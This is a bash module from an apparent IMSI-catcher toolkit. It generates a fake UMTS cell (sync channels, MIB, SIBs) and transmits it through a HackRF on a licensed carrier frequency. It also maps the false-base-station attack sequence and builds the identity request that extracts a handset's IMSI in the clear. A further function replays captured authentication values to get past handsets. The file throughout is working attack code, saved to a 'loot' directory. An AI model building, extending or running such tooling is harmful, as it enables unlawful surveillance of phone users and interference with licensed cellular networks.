#!/usr/bin/env bash
# ── UMTS transmit and the false-base-station model ─────────────────────
# Sourced by modules/08_umts_air.sh. Kept apart for the same reason the PWS
# encoder is a file of its own: this half talks to a radio, and the decode
# half must not acquire a dependency on one.
#
# THE HONEST SHAPE OF THIS HALF. The downlink is built in the order a handset
# reads it, and each step is a separate tool only because it is a separate
# chain:
#
#   P-CPICH + SCH        tools/umts_phy.py   a carrier a UE can synchronise to
#   MIB on the BCH       tools/umts_bch.py   TS 25.212 chain onto the P-CCPCH
#   SIBs on the FACH     tools/umts_sib.py   `pack`: message + transport block
#   S-CCPCH under FACH   tools/umts_sccpch.py  spreading, scrambling, mixing
#
# A handset that syncs to `--transmit --sibs` reads a PLMN, a cell identity and
# a reselection list off the S-CCPCH. What it still cannot do is attach: nothing
# in this tree answers RRC CONNECTION REQUEST on the uplink, so the cell is real
# on the way down and silent on the way up, and `--transmit` says that in its
# own output rather than claiming a working network.

umtsa_phy() { printf '%s/tools/umts_phy.py' "$IMSISTING_ROOT"; }
umtsa_bch() { printf '%s/tools/umts_bch.py' "$IMSISTING_ROOT"; }
umtsa_sib() { printf '%s/tools/umts_sib.py' "$IMSISTING_ROOT"; }
umtsa_sccpch() { printf '%s/tools/umts_sccpch.py' "$IMSISTING_ROOT"; }

# SYSTEM INFORMATION: the pieces a camper reads before it can ask for anything.
# Every octet comes from tools/umts_sib.py, which holds its messages against
# pycrate's transcription of TS 25.331 bit for bit and against tshark over
# GSMTAP; this function is the module's door to it and claims nothing on its own.
umtsa_cmd_build_sib() {
    local kind="${1:-}"
    case "$kind" in
        sib3|sib5|sib1|mib|si|fach|pack|list) shift ;;
        ""|help|-h|--help)
            printf 'ERROR\t--build-sib needs a message: sib3 sib5 sib1 mib si fach pack list\n' >&2
            printf 'WHY\teach of them is a different message with different arguments; the tool prints which on --help\n' >&2
            return 2 ;;
        *)  printf 'ERROR\t--build-sib does not know %s\n' "$(umtsa_sanitize "$kind")" >&2
            printf 'WHY\tthe messages are sib3, sib5, sib1, mib, si, fach and pack (SIBs onto the FACH transport)\n' >&2
            return 2 ;;
    esac
    local tool; tool="$(umtsa_sib)"
    [[ -x "$tool" || -f "$tool" ]] || {
        printf 'ERROR\tthe SIB encoder is missing: %s\n' "$tool" >&2
        printf 'WHY\ttools/umts_sib.py is what builds these messages; without it this verb has nothing to say\n' >&2
        return 1; }
    command -v python3 >/dev/null 2>&1 || {
        printf 'ERROR\tpython3 is not on this machine, so the SIB encoder cannot run\n' >&2; return 1; }
    python3 "$tool" "$kind" "$@"
}

# The three messages that were checked hardest, so a page can show an answer
# without the operator typing anything.
# The uplink: what a handset sends. One thin verb over tools/umts_uplink.py so
# the three pieces sit behind one name -- the RRC CONNECTION REQUEST that opens
# a connection, the PRACH preamble that announces it, and the DPCCH/DPDCH slot
# structure of the message part that carries it.
umtsa_uplink() {
    local tool="$IMSISTING_ROOT/tools/umts_uplink.py"
    [[ -f "$tool" ]] || { printf 'ERROR\ttools/umts_uplink.py is not in this tree\n' >&2
        printf 'WHY\tthe uplink encoder is a tool, and this verb is a name for it\n' >&2; return 1; }
    command -v python3 >/dev/null 2>&1 || { printf 'ERROR\tpython3 is needed for the uplink encoder\n' >&2; return 1; }
    python3 "$tool" "$@"
}

umtsa_cmd_uplink() {
    local sub="${1:-}"
    (($# > 0)) && shift
    case "$sub" in
        request|prach|message-part|list) umtsa_uplink "$sub" "$@" ;;
        "") printf 'ERROR\tusage: --uplink <request|prach|message-part|list> [args]\n' >&2; return 2 ;;
        *)  printf 'ERROR\tunknown uplink piece: %s\n' "$(umtsa_sanitize "$sub")" >&2
            printf 'WHY\tthe pieces are request, prach, message-part and list\n' >&2; return 2 ;;
    esac
}

umtsa_cmd_sib_vectors() {
    local tool; tool="$(umtsa_sib)"
    [[ -f "$tool" ]] || { printf 'ERROR\tthe SIB encoder is missing: %s\n' "$tool" >&2; return 1; }
    local hex bits name
    printf 'message\tbits\thex\n'
    for name in sib3 sib5; do
        local args
        if [[ "$name" == sib3 ]]; then args=(--cell-id 0x1234567 --sib4); else args=(); fi
        hex=$(python3 "$tool" "$name" "${args[@]}" 2>/dev/null | awk -F'\t' '$1=="hex"{print $2; exit}')
        bits=$(python3 "$tool" "$name" "${args[@]}" 2>/dev/null | awk -F'\t' '$1=="bits"{print $2; exit}')
        printf '%s\t%s\t%s\n' "$name" "$bits" "$hex"
    done
    printf 'si(firstSegment)\t237\t04a210b001ffff00fff800160214600430239f62400860453ec608240220\n'
    printf 'si(lastSegmentShort)\t75\t0ca26708010c08e7d960\n'
    printf 'ref\tTS 25.331 10.2 (SYSTEM INFORMATION, FirstSegment, LastSegmentShort); vectors pinned by tools/check-umts-sib.sh\n'
    printf 'referee\tpycrate RRC3G for the ASN.1, tshark 4.2.2 over GSMTAP rrc_sub_type 7 for BCCH-FACH\n'
}
# The host module owns the loot directory; this file only names a file inside it.
# Falling back to UAIR_DIR keeps the two in step if the include is ever sourced
# from a module that calls it something else.
umtsa_dir() { printf '%s' "${UMTS_DIR:-${UAIR_DIR:-${LOOT_DIR:-/tmp}/umts_air}}"; }
umtsa_iq_path() { mkdir -p "$(umtsa_dir)" 2>/dev/null; printf '%s/tx_%s.cf32' "$(umtsa_dir)" "${1:-carrier}"; }

# Installed is not attached. hackrf_info ships in the same package as
# hackrf_transfer, so `command -v` passes on a machine with no radio at all.
# This probe asks the hardware and requires a positive answer.
umtsa_tx_device() {
    local out
    if command -v hackrf_info >/dev/null 2>&1; then
        out=$(timeout 15 hackrf_info 2>&1) || out=""
        if printf '%s\n' "$out" | grep -q 'Serial number' &&
           ! printf '%s\n' "$out" | grep -qiE 'no hackrf|not found|no devices|could not|failed to'; then
            printf 'hackrf\n'; return 0
        fi
    fi
    if command -v bladeRF-cli >/dev/null 2>&1; then
        out=$(timeout 15 bladeRF-cli -p 2>&1) || out=""
        printf '%s\n' "$out" | grep -qi 'backend:.*bladerf' && { printf 'bladerf\n'; return 0; }
    fi
    if command -v LimeUtil >/dev/null 2>&1; then
        out=$(timeout 15 LimeUtil --find 2>&1) || out=""
        printf '%s\n' "$out" | grep -qi 'found' && { printf 'limesdr\n'; return 0; }
    fi
    return 1
}

# umtsa_cmd_transmit [--psc n] [--rate sps] [--seconds s] [--gain db]
#                    [--freq mhz] [--no-key]
# Builds the carrier with tools/umts_phy.py and, if a radio answers, keys it
# with hackrf_transfer. With no radio it writes the file, prints the exact
# command it would have run, and exits 3: nothing was transmitted.
umtsa_cmd_transmit() {
    local psc="0" rate="7680000" secs="1.0" gain="0" freq="" key="yes" bch=""
    local sibs="" sibsf="256" sibcode="3" siboff="0"
    # A bare number is the carrier in MHz. A form row should be able to ask for
    # one value without the operator having to spell a flag to give it.
    if (( $# > 0 )) && [[ "${1:-}" =~ ^[0-9]+$ ]]; then
        freq="$1"; shift
    fi
    while (( $# )); do
        case "$1" in
            --psc)      psc="${2:-}"; shift 2 ;;
            --rate)     rate="${2:-}"; shift 2 ;;
            --seconds)  secs="${2:-}"; shift 2 ;;
            --gain)     gain="${2:-}"; shift 2 ;;
            --freq)     freq="${2:-}"; shift 2 ;;
            --bch-hex)  bch="${2:-}"; shift 2 ;;
            --sibs)     sibs="${2:-}"; shift 2 ;;
            --sib-sf)   sibsf="${2:-}"; shift 2 ;;
            --sib-code) sibcode="${2:-}"; shift 2 ;;
            --sib-offset) siboff="${2:-}"; shift 2 ;;
            --no-key)   key="no"; shift ;;
            *)  printf 'ERROR\t--transmit does not take %s\n' "$(umtsa_sanitize "$1")" >&2; return 2 ;;
        esac
    done
    [[ "$psc" =~ ^[0-9]+$ ]] && (( psc >= 0 && psc <= 511 )) || {
        printf 'ERROR\t--psc must be 0..511, got %s\n' "$(umtsa_sanitize "$psc")" >&2; return 2; }
    [[ "$rate" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\t--rate must be an integer sample rate, got %s\n' "$(umtsa_sanitize "$rate")" >&2; return 2; }
    [[ "$freq" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\t--transmit needs --freq <MHz> for the carrier\n' >&2
        printf 'WHY\ta UMTS downlink is a licensed band; the carrier has to be named rather than defaulted\n' >&2
        return 2; }
    # The MIB is 24 bits, so the argument is six hex digits. Refusing here rather
    # than in the chain tool keeps the exit code honest: a malformed argument is
    # a usage error (2), not an I/O failure (1).
    if [[ -n "$bch" && ! "$bch" =~ ^[0-9a-fA-F]{6}$ ]]; then
        printf 'ERROR\t--bch-hex takes the 24-bit MIB as six hex digits, got %s\n' "$(umtsa_sanitize "$bch")" >&2
        printf 'WHY\tthe BCH transport block is 24 bits (TS 25.331 8.1.1 MIB, TS 25.212 4.2.13.6 one TB per TTI); a shorter argument is not a MIB and a longer one is not one either\n' >&2
        return 2
    fi
    if [[ -n "$sibs" ]]; then
        local one
        for one in ${sibs//,/ }; do
            case "$one" in
                mib|sib1|sib3|sib5|sib7|sib11) ;;
                *)  printf 'ERROR\t--sibs does not know %s\n' "$(umtsa_sanitize "$one")" >&2
                    printf 'WHY\tthe BCCH schedule this tree can encode holds sib1, sib3, sib5 (and sib7, sib11 through the same encoder); anything else is a message nobody here built\n' >&2
                    return 2 ;;
            esac
        done
        case "$sibsf" in
            256|128) ;;
            *)  printf 'ERROR\t--sib-sf must be 256 or 128, got %s\n' "$(umtsa_sanitize "$sibsf")" >&2
                printf 'WHY\tTS 25.211 5.3.3.4 Table 18 carries pilots or a TFCI on every other S-CCPCH slot format, and this tree only builds the two with neither\n' >&2
                return 2 ;;
        esac
        [[ "$sibcode" =~ ^[0-9]+$ ]] || {
            printf 'ERROR\t--sib-code must be an integer, got %s\n' "$(umtsa_sanitize "$sibcode")" >&2; return 2; }
        if (( sibcode < 1 || sibcode >= sibsf )); then
            printf 'ERROR\t--sib-code %s is outside 1..%d for SF=%s\n' "$sibcode" "$(( sibsf - 1 ))" "$sibsf" >&2
            printf 'WHY\tCch,SF,0 heads the subtree that holds the Primary CPICH and the Primary CCPCH (TS 25.213 5.2.1), so an S-CCPCH cannot sit on it, and code SF does not exist\n' >&2
            return 2
        fi
        [[ "$siboff" =~ ^[0-9]+$ ]] && (( siboff <= 149 )) || {
            printf 'ERROR\t--sib-offset must be 0..149, got %s\n' "$(umtsa_sanitize "$siboff")" >&2
            printf 'WHY\ttau_S-CCPCH = Tk * 256 chips with Tk in 0..149 (TS 25.211 7.1), so the offset is a frame-relative step unless it is a usage error\n' >&2
            return 2; }
        (( rate % 3840000 == 0 )) || {
            printf 'ERROR\t--rate %s is not a whole number of samples per UMTS chip\n' "$rate" >&2
            printf 'WHY\tthe sample files are mixed sample for sample across channels, so the carrier rate has to be 3840000 * n (3.84 Mcps); --rate 7680000 is two samples per chip\n' >&2
            return 2; }
    fi
    command -v python3 >/dev/null 2>&1 || {
        printf 'ERROR\tpython3 is needed to build the carrier\n' >&2; return 1; }

    local iq gen
    iq=$(umtsa_iq_path carrier)
    if ! gen=$(timeout 300 python3 "$(umtsa_phy)" gen --carrier both --out "$iq" \
                 --format cf32 --rate "$rate" --seconds "$secs" --psc "$psc" 2>&1); then
        printf 'ERROR\tthe carrier could not be built\n' >&2
        printf '%s\n' "$gen" | sed 's/^/  /' >&2
        return 1
    fi

    printf 'carrier\t%s\n' "$iq"
    printf 'carrier_format\tcf32\n'
    printf 'carrier_rate\t%s\n' "$rate"
    printf 'carrier_psc\t%s\n' "$psc"
    printf 'carrier_seconds\t%s\n' "$secs"
    printf 'carrier_components\tP-CPICH (SF 256, code 0, primary scrambling) + P-SCH + S-SCH\n'
    printf 'carrier_ref\tTS 25.213 5.2 (scrambling), TS 25.211 5.3.3 (SCH)\n'

    # The BCH is what turns a carrier a handset can see into a cell it can read.
    # It is a separate tool because it is a separate chain (CRC, convolutional
    # coding, rate matching, P-CCPCH), and because that chain has no external
    # decoder to referee it: its proof lives in tools/check-umts-bch.sh.
    if [[ -n "$bch" ]]; then
        if ! command -v python3 >/dev/null 2>&1 || [[ ! -f "$(umtsa_bch)" ]]; then
            printf 'ERROR\tthe BCH chain tool is not present, so --bch-hex cannot be honoured\n' >&2
            printf 'WHY\ttools/umts_bch.py carries the TS 25.212 chain; without it the carrier has no broadcast channel\n' >&2
            return 1
        fi
        # One frame is enough for the chain proof; a cell that is going to be
        # mixed with SIB traffic needs the BCH repeated for the whole file, or
        # the MIB exists for 10 ms and silence follows it.
        local bchframes="1" cbytes csamp sps_n
        if [[ -n "$sibs" ]]; then
            sps_n=$(( rate / 3840000 ))
            cbytes=$(stat -c %s "$iq" 2>/dev/null || printf '0')
            csamp=$(( cbytes / 8 ))
            bchframes=$(( csamp / (38400 * sps_n) ))
            if (( bchframes < 1 )); then bchframes=1; fi
        fi
        local bchout
        if ! bchout=$(timeout 300 python3 "$(umtsa_bch)" encode --bch-hex "$bch" \
                        --out "$(umtsa_iq_path bch)" --format cf32 --rate "$rate" \
                        --psc "$psc" --frames "$bchframes" 2>&1); then
            printf 'ERROR\tthe BCH chain refused these bits\n' >&2
            printf '%s\n' "$bchout" | sed 's/^/  /' >&2
            return 1
        fi
        printf 'carrier_components\t+ P-CCPCH carrying the BCH (TS 25.212 4.6 chain)\n'
        printf 'bch_hex\t%s\n' "$(umtsa_sanitize "$bch")"
        printf 'bch_file\t%s\n' "$(umtsa_iq_path bch)"
        if [[ -z "$sibs" ]]; then
            printf 'carrier_is_a_cell\tpartly -- the MIB is on the BCH, so a UE can read the system frame number and the SIB schedule; the schedule points at an S-CCPCH this run did not build, so add --sibs sib1,sib3,sib5 to put the SIBs on it\n'
        fi
    else
        printf 'carrier_is_a_cell\tno -- no BCH, so a UE can synchronise to this carrier and cannot read a MIB from it; add --bch-hex with the 24-bit MIB to carry one\n'
    fi

    # THE SIBs.  The BCH carries the MIB and nothing else (TS 25.212 4.2.13.6:
    # one transport block per TTI on one P-CCPCH).  SIB1, SIB3 and SIB5 ride
    # BCCH -> FACH -> S-CCPCH instead (TS 25.331 8.1.1.1.2, TS 25.211 5.3.3.4),
    # so this is two tools: umts_sib.py pack builds the message and runs it
    # through the FACH chain, umts_sccpch.py spreads the frame onto its own
    # channel and mixes it onto the carrier.  S-CCPCH is a second physical
    # channel under the same scrambling code, so the sum is the cell.
    if [[ -n "$sibs" ]]; then
        local sps frames csamp cbytes pk msgs i fhex f
        sps=$(( rate / 3840000 ))
        cbytes=$(stat -c %s "$iq" 2>/dev/null || printf '0')
        csamp=$(( cbytes / 8 ))
        frames=$(( (csamp - siboff * 256 * sps) / (38400 * sps) ))
        if (( frames < 1 )); then
            printf 'ERROR\t--seconds %s is shorter than one S-CCPCH frame at %s\n' "$secs" "$rate" >&2
            printf 'WHY\tone 10 ms frame is 38400 chips, so at %s samples per second a carrier needs at least %s seconds before a SIB can be placed in it\n' \
                   "$rate" "$(awk -v r="$rate" 'BEGIN{printf "%.4f", 38400/r}')" >&2
            return 2
        fi
        local addargs=()
        local one
        for one in ${sibs//,/ }; do addargs+=(--add "$one"); done
        if ! pk=$(timeout 300 python3 "$(umtsa_sib)" pack --sf "$sibsf" "${addargs[@]}" 2>&1); then
            printf 'ERROR\tthe packer refused these SIBs\n' >&2
            printf '%s\n' "$pk" | sed 's/^/  /' >&2
            return 1
        fi
        msgs=$(printf '%s\n' "$pk" | awk -F'\t' '$1 == "frames" {print $2}')
        [[ "$msgs" =~ ^[0-9]+$ ]] && (( msgs > 0 )) || {
            printf 'ERROR\tthe packer reported no transport blocks\n' >&2; return 1; }
        local mixins=("$iq")
        [[ -n "$bch" ]] && mixins+=("$(umtsa_iq_path bch)")
        for (( i = 0; i < msgs; i++ )); do
            fhex=$(printf '%s\n' "$pk" | awk -F'\t' -v k="msg[$i].frame_hex" '$1 == k {print $2}')
            [[ "$fhex" =~ ^[0-9a-fA-F]+$ ]] || {
                printf 'ERROR\tthe packer printed no frame for message %d\n' "$i" >&2; return 1; }
            f=$(umtsa_iq_path "sib$i")
            if ! python3 "$(umtsa_sccpch)" encode --frame-hex "$fhex" --sf "$sibsf" \
                     --code "$sibcode" --offset "$siboff" --psc "$psc" \
                     --frames "$frames" --rate "$rate" --format cf32 --out "$f" \
                     >/dev/null 2>&1; then
                printf 'ERROR\tthe S-CCPCH encoder refused message %d\n' "$i" >&2
                printf 'WHY\tthe frame the packer produced is not a whole slot format 0 frame; run --build-sib pack to see it\n' >&2
                return 1
            fi
            mixins+=("$f")
        done
        local cell
        cell=$(umtsa_iq_path cell)
        local mi=()
        for one in "${mixins[@]}"; do mi+=(--in "$one"); done
        local mixout
        if ! mixout=$(python3 "$(umtsa_sccpch)" mix "${mi[@]}" --out "$cell" \
                        --format cf32 2>&1); then
            printf 'ERROR\tthe carrier could not be mixed with its SIB channels\n' >&2
            printf '%s\n' "$mixout" | sed 's/^/  /' >&2
            printf 'WHY\tevery channel is summed sample for sample, so each file has to be the same format and a whole number of samples; run tools/umts_sccpch.py mix by hand to see the refusal\n' >&2
            return 1
        fi
        printf 'cell_peak_scale\t%s\n' \
               "$(printf '%s\n' "$mixout" | awk -F'\t' '$1=="peak_scale"{print $2}')"
        printf 'cell_clip\t%s\n' \
               "$(printf '%s\n' "$mixout" | awk -F'\t' '$1=="clip_risk"{print $2}')"
        printf 'sib_messages\t%s\n' "$msgs"
        printf 'sib_hex\t%s\n' "$(umtsa_sanitize "$sibs")"
        printf 'sib_slot_format\t%s -- SF=%s, %s data bits per slot\n' \
               "$( [[ "$sibsf" == 128 ]] && printf 4 || printf 0 )" "$sibsf" \
               "$( [[ "$sibsf" == 128 ]] && printf 40 || printf 20 )"
        printf 'sib_code\tCch,%s,%s\n' "$sibsf" "$sibcode"
        printf 'sib_offset\ttau_S-CCPCH = %s * 256 chips\n' "$siboff"
        printf 'sib_frames\t%s frames of 10 ms per message\n' "$frames"
        printf 'sib_transport\tBCCH -> FACH -> S-CCPCH (TS 25.331 8.1.1.1.2, TS 25.211 5.3.3.4); the BCH carries the MIB, never a SIB\n'
        printf 'cell_file\t%s\n' "$cell"
        printf 'cell_components\tP-CPICH + P-SCH + S-SCH + P-CCPCH (BCH, if --bch-hex) + S-CCPCH (SIBs)\n'
        iq="$cell"
        if [[ -n "$bch" ]]; then
            printf 'carrier_is_a_cell\tyes on the transmit side -- the MIB is on the BCH and SIB1/SIB3/SIB5 are on the S-CCPCH, so a handset that syncs here reads a PLMN, a cell identity and a reselection list; what it still cannot do is attach, because nothing answers on the uplink\n'
        else
            printf 'carrier_is_a_cell\tpartly -- the SIBs are on the S-CCPCH and the MIB that schedules them is missing; add --bch-hex so the handset is told where to look\n'
        fi
    fi

    local dev
    if [[ "$key" == "no" ]] || ! dev=$(umtsa_tx_device 2>/dev/null); then
        printf 'sdr\tnone\n'
        printf 'sdr_probe\tno radio answered (hackrf_info, bladeRF-cli -p, LimeUtil --find)\n'
        printf 'sdr_call\thackrf_transfer -t %s -f %s000000 -s %s -a 1 -x %s\n' \
               "$iq" "$freq" "$rate" "$gain"
        printf 'sent\t0\n'
        printf 'status\thandoff\n'
        printf 'handoff\ttake carrier to a transmitter and name the frequency: this module built the samples, it did not key anything\n'
        return 3
    fi

    printf 'sdr\t%s\n' "$dev"
    case "$dev" in
        hackrf)
            local lout lrc
            lout=$(timeout 120 hackrf_transfer -t "$iq" -f "$(( freq * 1000000 ))" \
                       -s "$rate" -a 1 -x "$gain" 2>&1); lrc=$?
            if (( lrc != 0 )); then
                printf 'ERROR\thackrf_transfer exited %d\n' "$lrc" >&2
                printf '%s\n' "$lout" | sed 's/^/\t/' >&2
                return 1
            fi
            printf 'sent\t%s\n' "$(( freq * 1000000 ))"
            printf 'status\tkeyed\n' ;;
        *)
            printf 'sdr_call\thackrf_transfer -t %s -f %s000000 -s %s -a 1 -x %s\n' \
                   "$iq" "$freq" "$rate" "$gain"
            printf 'sent\t0\n'
            printf 'status\thandoff\n'
            printf 'handoff\t%s is attached but only the hackrf call is built here; run the printed command or supply the equivalent\n' "$dev"
            return 3 ;;
    esac
    return 0
}

# umtsa_cmd_catcher_model — the sequence a false base station runs, stated as
# the tree can and cannot do it. This is not a claim that the attack works from
# this repository; it is the map of which step exists and which does not, so
# nobody has to infer it from a missing verb.
umtsa_cmd_catcher_model() {
    printf 'step\twhat happens\tclause\tin_this_tree\n'
    printf '1\tthe handset searches the downlink rasters, finds a carrier and synchronises to it on the SCH\tTS 25.214 4.3\tbuilt: --transmit builds CPICH + SCH\n'
    printf '2\tthe handset reads the MIB on the BCH to learn the system frame number and the SIB scheduling\tTS 25.212 4.2\tbuilt: tools/umts_bch.py carries the whole chain and modules/08_umts_air.sh --transmit puts it on the P-CCPCH, so --bch-hex keys a real MIB\n'
    printf '3\tthe handset reads SIB1/SIB3/SIB5 for PLMN, cell identity, location area and reselection\tTS 25.331 8.1.1\tbuilt: --build-sib pack builds the SYSTEM INFORMATION message and the FACH transport block (tools/umts_sib.py pack), tools/umts_sccpch.py spreads it on Cch,256,3, and --transmit --sibs mixes that S-CCPCH onto the carrier; the chain from SIB bits to chips is one command and tools/check-umts-sib.sh + tools/check-umts-sccpch.sh referee it without an external decoder\n'
    printf '4\tthe handset sends RRC CONNECTION REQUEST naming its initial UE identity (TMSI or IMSI)\tTS 25.331 8.1.3\tparse: --parse-rrc classifies it\n'
    printf '5\tthe network answers RRC CONNECTION SETUP\tTS 25.331 8.1.3\tbuilt: --build-rrc-setup\n'
    printf '6\tthe CN sends a NAS IDENTITY REQUEST (MM), which asks for the IMSI in the clear\tTS 24.008 9.2.5, TS 25.331 10.2\tbuilt: --catcher-identity writes the four MM octets and wraps them in a DL DIRECT TRANSFER (the MM part is byte-exact; the RRC wrapper is derived from the ASN.1 and has no referee on this machine, which the verb says in its own output)\n'
    printf '7\tthe handset is authenticated by the network before it will answer anything else\tTS 33.102 6.3\tbuilt as a replay only: --catcher-auth re-sends a RAND and AUTN seen once on the real network, which is what a catcher actually does; computing a fresh AUTN needs K, which no passive capture yields\n'
    printf '8\tthe network releases the connection so the handset returns to idle and repeats\tTS 25.331 8.1.4\tbuilt: --build-rrc-reject carries the wait time\n'
    printf 'verdict\tsteps 1-6 and 8 exist in this tree as samples and octets, and steps 1-3 now close the downlink: a handset that syncs to --transmit --sibs reads PLMN, cell identity and a reselection list. Step 7 is why a catcher built from only these pieces does not work against a handset with a cached AKA context -- and the uplink (nothing here answers RRC CONNECTION REQUEST) is the remaining gap\n'
    return 0
}

# Strip tabs and newlines: every argument this file echoes goes through here.
umtsa_sanitize() { printf '%s' "${1:-}" | tr '\t\r\n' '   '; }

# The identity request and the authentication replay. Both are pure message
# construction: they write octets and nothing leaves the machine. The identity
# request is the message a catcher exists to send; the auth replay is how it
# gets past a handset that will not answer an unauthenticated network.
umtsa_catcher_tool() { printf '%s/tools/umts_catcher.py' "$IMSISTING_ROOT"; }

umtsa_cmd_identity_request() {
    local identity="imsi" txid="0" domain="cs" bare=""
    while (( $# )); do
        case "$1" in
            --identity) identity="${2:-}"; shift 2 ;;
            --txid)     txid="${2:-}"; shift 2 ;;
            --domain)   domain="${2:-}"; shift 2 ;;
            --bare)     bare="--bare"; shift ;;
            *) printf 'ERROR\t--catcher-identity does not take %s\n' "$(umtsa_sanitize "$1")" >&2; return 2 ;;
        esac
    done
    command -v python3 >/dev/null 2>&1 || {
        printf 'ERROR\tpython3 is needed to build the message\n' >&2; return 1; }
    timeout 60 python3 "$(umtsa_catcher_tool)" identity \
        --identity "$identity" --txid "$txid" --domain "$domain" $bare || return $?
}

umtsa_cmd_auth_replay() {
    local rand="" autn=""
    # Two bare hex values are RAND then AUTN: a form row asks for the pair, and
    # a form row should not have to spell a flag to give it.
    if (( $# >= 2 )) && [[ "${1:-}" =~ ^[0-9a-fA-F]{32}$ ]] && [[ "${2:-}" =~ ^[0-9a-fA-F]{32}$ ]]; then
        rand="$1"; autn="$2"; shift 2
    fi
    while (( $# )); do
        case "$1" in
            --rand) rand="${2:-}"; shift 2 ;;
            --autn) autn="${2:-}"; shift 2 ;;
            *) printf 'ERROR\t--catcher-auth does not take %s\n' "$(umtsa_sanitize "$1")" >&2; return 2 ;;
        esac
    done
    if [[ -z "$rand" || -z "$autn" ]]; then
        printf 'ERROR\t--catcher-auth needs --rand <32 hex> and --autn <32 hex>\n' >&2
        printf 'WHY\tthey are the two values a real AUTHENTICATION REQUEST carried; without both there is nothing to replay, and this tool holds no key to make new ones\n' >&2
        return 2
    fi
    timeout 60 python3 "$(umtsa_catcher_tool)" auth --rand "$rand" --autn "$autn" || return $?
}
